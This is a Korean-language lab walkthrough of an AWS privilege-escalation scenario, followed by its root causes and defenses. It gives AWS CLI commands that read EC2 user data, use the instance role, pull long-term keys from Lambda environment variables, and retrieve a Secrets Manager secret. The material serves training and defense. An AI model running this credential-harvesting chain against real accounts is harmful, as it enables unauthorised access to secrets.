# 02. Data Secrets

- 난이도: Easy
- 핵심: 작은 정보 노출이 여러 Identity 전환과 결합되어 Secrets Manager까지 이어지는 과정을 확인합니다.

## Attack Path

```mermaid
flowchart LR
    A[Start User] -->|Describe EC2| B[Instance Metadata]
    B -->|User Data 노출| C[SSH Access]
    C -->|IMDS| D[Instance Role]
    D -->|Lambda 조회| E[Environment Credentials]
    E --> F[Secondary Identity]
    F -->|GetSecretValue| G[Secrets Manager]
```

## 1. EC2와 User Data 조사

Scenario Region을 명시해 Instance를 찾습니다.

```bash
PROFILE=<PROFILE>
REGION=<REGION>

aws ec2 describe-instances \
  --profile "$PROFILE" \
  --region "$REGION"

aws ec2 describe-instance-attribute \
  --instance-id <INSTANCE_ID> \
  --attribute userData \
  --profile "$PROFILE" \
  --region "$REGION"
```

User Data는 Base64로 표현될 수 있지만 암호화된 Secret은 아닙니다. Lab에서는 초기화 Script에서 SSH 접근 정보를 확인합니다.

## 2. Instance Role 확인

허가된 Scenario Instance에 접속한 뒤 IMDSv2를 통해 연결된 Role 이름과 임시 자격 증명의 존재를 확인합니다. 값 자체는 문서나 Shell History에 남기지 않습니다.

```text
EC2 Process
  → Instance Metadata Service
  → Instance Profile Role
  → Temporary Credentials
```

SDK는 이 자격 증명을 자동으로 사용하므로 먼저 현재 신원을 확인합니다.

```bash
aws sts get-caller-identity --region "$REGION"
```

## 3. Lambda Configuration 조사

```bash
aws lambda list-functions --region "$REGION"

aws lambda get-function-configuration \
  --function-name <FUNCTION_NAME> \
  --region "$REGION"
```

Lab의 Function 환경 변수에는 다른 IAM Identity의 장기 Credential이 들어 있습니다. 이를 별도 Profile로 등록한 뒤 신원을 확인하고, 허용된 Secret만 조회합니다.

```bash
aws sts get-caller-identity --profile <SECONDARY_PROFILE>

aws secretsmanager list-secrets \
  --profile <SECONDARY_PROFILE> \
  --region "$REGION"

aws secretsmanager get-secret-value \
  --secret-id <SCENARIO_SECRET> \
  --profile <SECONDARY_PROFILE> \
  --region "$REGION" \
  --query SecretString \
  --output text
```

## Root Cause

1. User Data에 로그인 정보를 저장했습니다.
2. 외부에서 Instance에 접근할 수 있었습니다.
3. Instance Role의 권한 범위가 넓었습니다.
4. Lambda 환경 변수에 장기 Access Key를 저장했습니다.
5. 노출된 Identity가 Secret을 읽을 수 있었습니다.

## Defense

- User Data에는 Secret 대신 안전한 Bootstrap 절차만 둡니다.
- IMDSv2를 요구하고 SSRF·Container 경계를 보호합니다.
- Workload에는 장기 Key가 아닌 Role을 연결합니다.
- Secret은 Secrets Manager에서 Runtime에 읽고 정기적으로 Rotation합니다.
- `GetFunctionConfiguration`과 `GetSecretValue` 권한을 최소화하고 Data Event를 기록합니다.
